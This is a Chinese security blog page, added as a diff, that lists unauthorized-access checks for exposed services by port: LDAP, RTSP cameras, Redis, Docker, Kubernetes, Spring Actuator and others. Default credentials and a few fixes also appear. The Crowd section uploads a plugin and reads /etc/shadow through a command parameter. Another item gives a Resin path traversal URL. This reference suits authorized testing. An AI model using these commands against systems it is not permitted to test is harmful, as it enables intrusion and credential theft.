@@ -1,0 +1,684 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="booom">
+  <meta name="keywords" content="">
+  <title>未授权访问漏洞总结 - wiki</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Doing's NOTE</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-14 09:28" pubdate>
+        2020年12月14日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">未授权访问漏洞总结</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="未授权访问漏洞总结"><a href="#未授权访问漏洞总结" class="headerlink" title="未授权访问漏洞总结"></a>未授权访问漏洞总结</h1><p>[TOC]</p>
+<h2 id="ldap—–389"><a href="#ldap—–389" class="headerlink" title="ldap—–389"></a>ldap—–389</h2><p>脚本验证</p>
+<pre><code class="hljs routeros"><span class="hljs-comment">#! /usr/bin/env python</span>
+<span class="hljs-comment"># _*_  coding:utf-8 _*_</span>
+
+<span class="hljs-keyword">from</span> ldap3 import Connection,Server,ALL
+def ldap_anonymous(ip):
+    try:
+       <span class="hljs-built_in"> server </span>= Server(ip,<span class="hljs-attribute">get_info</span>=ALL,connect_timeout=1)
+        conn = Connection(server, <span class="hljs-attribute">auto_bind</span>=<span class="hljs-literal">True</span>)
+        <span class="hljs-builtin-name">print</span> <span class="hljs-string">"[+] ldap login for anonymous"</span>
+        conn.closed
+    except:
+        #pass
+        <span class="hljs-builtin-name">print</span> <span class="hljs-string">'[-] checking for ldap anonymous fail'</span></code></pre>
+
+<p>工具验证<a href="https://www.cnblogs.com/Zh1z3ven/p/13894171.html" target="_blank" rel="noopener">https://www.cnblogs.com/Zh1z3ven/p/13894171.html</a></p>
+<p><a href="http://www.ldapadmin.org/download/ldapadmin.html" target="_blank" rel="noopener">http://www.ldapadmin.org/download/ldapadmin.html</a></p>
+<h2 id="RTSP—–554"><a href="#RTSP—–554" class="headerlink" title="RTSP—–554"></a>RTSP—–554</h2><p>RTSP（Real Time Streaming Protocol），实时流传输协议，是TCP/IP协议体系中的一个应用层协议，该协议定义了一对多应用程序如何有效地通过IP网络传送多媒体数据，被广泛用于视频直播领域,为方便用户远程监控摄像头内容，许多摄像头厂商会在摄像头或NVR中开启RTSP服务器。</p>
+<p><strong>漏洞验证</strong></p>
+<p>使用nmap扫描开放的端口和服务，初步判断后使用相关的工具的链接测试。</p>
+<p>这里以<a href="https://www.videolan.org/vlc/" target="_blank" rel="noopener">VLC media player</a>为例进行漏洞验证。单击“媒体”选项，选择“打开网络串流”。<br>在弹出的窗口中输入网络URL：<br>rtsp://admin:<a href="mailto:888888@192.168.1.1">888888@192.168.1.1</a>:554/cam/realmonitor?channel=2&amp;subtype=1</p>
+<p>说明:<br>RTSP地址：rtsp://username:password@ip:port/cam/realmonitor?channel=1&amp;subtype=0<br>username: 用户名。例如admin。<br>password: 密码。例如admin。<br>ip: 为设备IP。例如 192.168.1.1。<br>port: 端口号默认为554，若为默认可不填写。<br>channel: 通道号，起始为1。例如通道2，则为channel=2。<br>subtype: 码流类型，主码流为0（即subtype=0），辅码流为1（即subtype=1）。<br>例如，请求某设备的通道2的辅码流，URL如下<br>rtsp://admin:<a href="mailto:admin@192.168.1.1">admin@192.168.1.1</a>:554/cam/realmonitor?channel=2&amp;subtype=1</p>
+<h2 id="rsync—–873—"><a href="#rsync—–873—" class="headerlink" title="rsync—–873—-"></a>rsync—–873—-</h2><p>未授权访问测试</p>
+<pre><code class="hljs groovy">rsync <span class="hljs-string">rsync:</span><span class="hljs-comment">//172.16.2.250:873/</span></code></pre>
+
+<h2 id="Lotus—–1352"><a href="#Lotus—–1352" class="headerlink" title="Lotus—–1352"></a>Lotus—–1352</h2><p>信息泄露</p>
+<p>访问/diiop_ior.nsf</p>
+<h2 id="nfs—–2049"><a href="#nfs—–2049" class="headerlink" title="nfs—–2049"></a>nfs—–2049</h2><p>未授权访问验证 </p>
+<pre><code class="hljs armasm"><span class="hljs-symbol">showmount</span> -e <span class="hljs-built_in">ip</span></code></pre>
+
+<h2 id="Zookeeper—–2181—"><a href="#Zookeeper—–2181—" class="headerlink" title="Zookeeper—–2181—-"></a>Zookeeper—–2181—-</h2><p>未授权访问测试</p>
+<pre><code class="hljs yaml"><span class="hljs-comment">#获取该服务器的环境</span>
+<span class="hljs-string">echo</span> <span class="hljs-string">envi|nc</span> <span class="hljs-number">172.16</span><span class="hljs-number">.2</span><span class="hljs-number">.251</span> <span class="hljs-number">2181</span></code></pre>
+
+<h2 id="Docker—–2375—"><a href="#Docker—–2375—" class="headerlink" title="Docker—–2375—-"></a>Docker—–2375—-</h2><p>2375是docker远程操控的默认端口，通过这个端口可以直接对远程的docker daemon进行操作。</p>
+<p>未授权访问测试</p>
+<pre><code class="hljs groovy">docker -H <span class="hljs-string">tcp:</span><span class="hljs-comment">//192.168.15.5:2375 version</span></code></pre>
+
+<h2 id="kibana—–5601"><a href="#kibana—–5601" class="headerlink" title="kibana—–5601"></a>kibana—–5601</h2><p>未授权访问测试</p>
+<p>直接访问kibana的页面，如：</p>
+<p><a href="https://xx.xx.xxx.xx:5601/" target="_blank" rel="noopener">https://10.10.4.89:5601/</a> </p>
+<p><a href="https://xx.xx.xx/app/kibana#" target="_blank" rel="noopener">https://10.10.4.89/app/kibana#</a>  </p>
+<p><a href="http://10.10.4.89:5601/app/kibana#/" target="_blank" rel="noopener">http://10.10.4.89:5601/app/kibana#/</a></p>
+<p>并且无需账号密码可以登录进入界面。</p>
+<h2 id="VNC—–5900-5901"><a href="#VNC—–5900-5901" class="headerlink" title="VNC—–5900/5901"></a>VNC—–5900/5901</h2><p>未授权访问测试</p>
+<pre><code class="hljs angelscript">vncviewer <span class="hljs-number">192.168</span><span class="hljs-number">.15</span><span class="hljs-number">.8</span></code></pre>
+
+<h2 id="CouchDB-—–5984—"><a href="#CouchDB-—–5984—" class="headerlink" title="CouchDB —–5984—-"></a>CouchDB —–5984—-</h2><p>未授权访问测试</p>
+<pre><code class="hljs groovy">curl <span class="hljs-string">http:</span><span class="hljs-comment">//192.168.1.1:5984</span>
+curl <span class="hljs-string">http:</span><span class="hljs-comment">//192.168.1.1:5984/_config</span></code></pre>
+
+<h2 id="redis—–6379—"><a href="#redis—–6379—" class="headerlink" title="redis—–6379—-"></a>redis—–6379—-</h2><p>未授权访问测试</p>
+<pre><code class="hljs angelscript">windows
+redis-cli.exe -h <span class="hljs-number">192.168</span><span class="hljs-number">.18</span><span class="hljs-number">.138</span> -p <span class="hljs-number">6379</span>
+
+linux
+redis-cli -h <span class="hljs-number">192.168</span><span class="hljs-number">.18</span><span class="hljs-number">.138</span> -p <span class="hljs-number">6379</span></code></pre>
+
+<h2 id="Jenkins—–8080—"><a href="#Jenkins—–8080—" class="headerlink" title="Jenkins—–8080—-"></a>Jenkins—–8080—-</h2><p>未授权访问测试</p>
+<p><code>访问http://192.168.1.1:8080/manage</code></p>
+<h2 id="JBOSS—–8080—"><a href="#JBOSS—–8080—" class="headerlink" title="JBOSS—–8080—-"></a>JBOSS—–8080—-</h2><p>未授权访问测试</p>
+<p><a href="http://192.168.1.1:8080/jmx-console/" target="_blank" rel="noopener">http://192.168.1.1:8080/jmx-console/</a></p>
+<h2 id="spring—–8080"><a href="#spring—–8080" class="headerlink" title="spring—–8080"></a>spring—–8080</h2><pre><code class="hljs jboss-cli">http:<span class="hljs-string">//</span>**.**.**.**<span class="hljs-string">/info</span>
+Spring Boot Actuator未授权访问
+<span class="hljs-string">/dump</span> - 显示线程转储（包括堆栈跟踪）
+<span class="hljs-string">/autoconfig</span> - 显示自动配置报告
+<span class="hljs-string">/configprops</span> - 显示配置属性
+<span class="hljs-string">/trace</span> - 显示最后几条HTTP消息（可能包含会话标识符）
+<span class="hljs-string">/logfile</span> - 输出日志文件的内容
+<span class="hljs-string">/shutdown</span> - 关闭应用程序
+<span class="hljs-string">/info</span> - 显示应用信息
+<span class="hljs-string">/metrics</span> - 显示当前应用的’指标’信息
+<span class="hljs-string">/health</span> - 显示应用程序的健康指标
+<span class="hljs-string">/beans</span> - 显示Spring Beans的完整列表
+<span class="hljs-string">/mappings</span> - 显示所有MVC控制器映射
+<span class="hljs-string">/env</span> - 提供对配置环境的访问
+<span class="hljs-string">/restart</span> - 重新启动应用程序
+当 web 应用程序出现 4xx、5xx 错误时显示类似以下页面就能确定当前 web 应用是使用了 springboot 框架。</code></pre>
+
+<h2 id="Kubernetes-Api-Server—–8080"><a href="#Kubernetes-Api-Server—–8080" class="headerlink" title="Kubernetes Api Server—–8080"></a>Kubernetes Api Server—–8080</h2><p>未授权访问测试</p>
+<p>端口：8080：<a href="http://10.10.4.89:8080/" target="_blank" rel="noopener">http://10.10.4.89:8080/</a></p>
+<p>端口：8080： api dashboard： <a href="http://10.10.4.89:8080/ui" target="_blank" rel="noopener">http://10.10.4.89:8080/ui</a></p>
+<p>端口：10250：端口是kubelet API的HTTPS端口，通过路径/pods获取环境变量、运行的容器信息、命名空间等信息。</p>
+<p><a href="http://10.10.4.89:10250/pods" target="_blank" rel="noopener">http://10.10.4.89:10250/pods</a></p>
+<h2 id="Resin—–8080"><a href="#Resin—–8080" class="headerlink" title="Resin—–8080"></a>Resin—–8080</h2><p>目录遍历</p>
+<p><a href="http://www.example.com:8080/%20../web-inf" target="_blank" rel="noopener">http://www.example.com:8080/%20../web-inf</a></p>
+<p>远程文件读取</p>
+<h2 id="Atlassian-Crowd—–8095"><a href="#Atlassian-Crowd—–8095" class="headerlink" title="Atlassian Crowd—–8095"></a>Atlassian Crowd—–8095</h2><p>未授权访问测试</p>
+<pre><code class="hljs elixir">curl --form <span class="hljs-string">"file_cdl=@applinks-plugin-5.4.12.jar"</span> <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.18.138:8095/crowd</span><span class="hljs-regexp">/admin/uploadplugin</span>.action -v
+访问地址并执行命令：<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.10.20.166:8095/crowd</span><span class="hljs-regexp">/plugins/servlet</span><span class="hljs-regexp">/exp?cmd=cat%20/etc</span><span class="hljs-regexp">/shadow</span></code></pre>
+
+<h2 id="ActiveMQ—–8161"><a href="#ActiveMQ—–8161" class="headerlink" title="ActiveMQ—–8161"></a>ActiveMQ—–8161</h2><p>ActiveMQ默认使用8161端口，默认用户名和密码是admin/admin.</p>
+<p>浏览器访问</p>
+<h2 id="Jupyter-Notebook—–8888"><a href="#Jupyter-Notebook—–8888" class="headerlink" title="Jupyter Notebook—–8888"></a>Jupyter Notebook—–8888</h2><p>访问 <a href="http://192.168.1.1:8888" target="_blank" rel="noopener">http://192.168.1.1:8888</a></p>
+<h2 id="SOLR—–8983"><a href="#SOLR—–8983" class="headerlink" title="SOLR—–8983"></a>SOLR—–8983</h2><pre><code class="hljs asciidoc">http://*<span class="hljs-strong">*.*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*/solr/#/</span>
+<span class="hljs-strong">http://*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*/search.zip</span>
+<span class="hljs-strong">http://*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*.*</span><span class="hljs-strong">*/search/</span></code></pre>
+
+<h2 id="Elasticsearch—–9200-9300—"><a href="#Elasticsearch—–9200-9300—" class="headerlink" title="Elasticsearch—–9200/9300—-"></a>Elasticsearch—–9200/9300—-</h2><p>未授权访问测试</p>
+<pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> http://localhost:9200/_nodes <span class="hljs-comment">#查看节点数据</span></code></pre>
+
+<h2 id="Memcached—–11211—–"><a href="#Memcached—–11211—–" class="headerlink" title="Memcached—–11211—–"></a>Memcached—–11211—–</h2><p>未授权访问测试</p>
+<pre><code class="hljs yaml"><span class="hljs-string">telnet</span> <span class="hljs-number">10.0</span><span class="hljs-number">.4</span><span class="hljs-number">.138</span> <span class="hljs-number">11211</span>
+<span class="hljs-string">stats</span> <span class="hljs-comment">#查看memcache服务状态</span></code></pre>
+
+<h2 id="Dubbo—–11211"><a href="#Dubbo—–11211" class="headerlink" title="Dubbo—–11211"></a>Dubbo—–11211</h2><p>Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p>
+<p><strong>漏洞验证</strong></p>
+<p>telent IP port</p>
+<h2 id="RabbitMQ—–15672"><a href="#RabbitMQ—–15672" class="headerlink" title="RabbitMQ—–15672"></a>RabbitMQ—–15672</h2><p>RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。 消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p>
+<p>未授权访问测试</p>
+<p><a href="http://10.10.4.89:15672" target="_blank" rel="noopener">http://10.10.4.89:15672</a></p>
+<p><a href="http://10.10.4.89:25672/" target="_blank" rel="noopener">http://10.10.4.89:25672/</a></p>
+<p><a href="http://10.10.4.89:15692/" target="_blank" rel="noopener">http://10.10.4.89:15692/</a></p>
+<p>默认账号密码都是guest</p>
+<p>修复建议：</p>
+<p>方法一：修改为强密码，删除默认的账号guest</p>
+<p>方法二：禁止对外网开放，仅限于内部访问。</p>
+<h2 id="Mongodb—–27017—"><a href="#Mongodb—–27017—" class="headerlink" title="Mongodb—–27017—-"></a>Mongodb—–27017—-</h2><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">27017</span> --script mongodb-<span class="hljs-literal">info</span> &lt;target&gt;</code></pre>
+
+<h2 id="Hadoop—–50070—"><a href="#Hadoop—–50070—" class="headerlink" title="Hadoop—–50070—-"></a>Hadoop—–50070—-</h2><p>未授权访问测试</p>
+<p>访问 <a href="http://192.168.1.1:8088/cluster" target="_blank" rel="noopener">http://192.168.1.1:8088/cluster</a></p>
+<h2 id="Druid未授权访问"><a href="#Druid未授权访问" class="headerlink" title="Druid未授权访问"></a>Druid未授权访问</h2><p>/druid/index.html<br>/druid/datasource.html<br>/druid/sql.html<br>/druid/wall.html<br>/druid/webapp.html<br>/druid/weburi.html<br>/druid/websession.html<br>/druid/spring.html<br>/druid/api.html</p>
+<p>/system/druid/websession.html</p>
+<p>/webpage/system/druid/websession.html(jeecg)</p>
+<p><strong>漏洞验证</strong></p>
+<p>访问相关的路径：<a href="http://10.20.37.152:7001/BSCC/druid/index.html" target="_blank" rel="noopener">http://10.20.37.152:7001/BSCC/druid/index.html</a></p>
+<h2 id="javaMelody"><a href="#javaMelody" class="headerlink" title="javaMelody"></a>javaMelody</h2><p>/monitoring路由</p>
+<p>该漏洞修复比较简单，直接更新JavaMelody至1.74.0即可</p>
+<h2 id="批量检测脚本"><a href="#批量检测脚本" class="headerlink" title="批量检测脚本"></a>批量检测脚本</h2><p>检测部分未授权访问。<a href="https://github.com/test502git/Scanunauthorized" target="_blank" rel="noopener">https://github.com/test502git/Scanunauthorized</a></p>
+<p>检测速度快, 支持<code>批量</code>, <code>多线程</code>, 使用python3编写</p>
+<p>把整理好的ip放到当前host.txt文本中，使用Python3运行该项目即可</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.0xby.com/3174.html" target="_blank" rel="noopener">http://www.0xby.com/3174.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%80%BB%E7%BB%93/">总结</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/07/WebLogic-CVE-2020-14825/">
+                        <span class="hidden-mobile">Oracle WebLogic Server远程代码执行漏洞（CVE-2020-14825）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz",
+          app_key: "oFcTVTBJYrfsIGdYNnoWMVJ9",
+          placeholder: "留下你的足迹",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+<a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hexo-Fluid</span></a>
+
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "未授权访问漏洞总结&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?d8cb5311ff5a7a66ad88e94f5290da89";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
